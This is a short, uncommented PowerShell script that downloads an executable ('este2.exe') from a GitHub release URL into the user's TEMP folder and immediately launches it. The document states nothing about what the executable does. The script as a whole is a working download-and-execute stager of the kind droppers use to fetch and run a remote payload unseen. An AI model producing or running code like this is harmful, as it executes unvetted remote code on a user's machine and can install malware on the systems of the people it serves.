[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$url = "https://github.com/mirapuedovolar2/ps1prueba/releases/download/hola2/este2.exe"
$destino = "$env:TEMP\este2.exe"

Invoke-WebRequest -Uri $url -OutFile $destino
Start-Process -FilePath $destino
